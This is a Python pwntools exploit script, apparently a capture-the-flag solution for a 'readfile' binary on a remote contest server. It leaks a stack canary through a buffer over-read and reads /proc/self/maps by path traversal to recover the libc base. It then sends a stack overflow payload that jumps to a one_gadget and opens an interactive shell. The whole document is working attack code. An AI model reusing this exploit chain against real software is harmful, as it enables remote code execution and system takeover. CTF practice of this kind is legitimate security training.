#!/usr/bin/python3

from pwn import *

exe = ELF('readfile', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

p = remote('pwn.battlectf.online', 1000)

############################
### Stage 1: Leak canary ###
############################
p.sendafter(b'name: ', b'A'*0x29)
p.sendlineafter(b'> ', b'1')
p.sendafter(b'name: ', b'A'*0x30)
p.recvuntil(b'A'*0x58)
canary = (u64(p.recv(8)) >> 8) << 8
log.info("Canary: " + hex(canary))

##############################################
### Stage 2: Leak libc via /proc/self/maps ###
##############################################
p.sendlineafter(b'> ', b'1')
p.sendafter(b'name: ', b'../../../' + b'./'*12 + b'proc/self/maps')
output = p.recvuntil(b'libc.so.6').split(b'\n')[-1]
libc.address = int(output[:output.index(b'-')], 16)
log.info("Libc base: " + hex(libc.address))

##########################################
### Stage 3: Get shell with one_gadget ###
##########################################
p.sendlineafter(b'> ', b'2')
payload = flat(
	b'A'*0x28,
	canary,
	0,
	libc.address + 0x50a37
	)
p.sendlineafter(b'feedback: ', payload)

p.interactive()
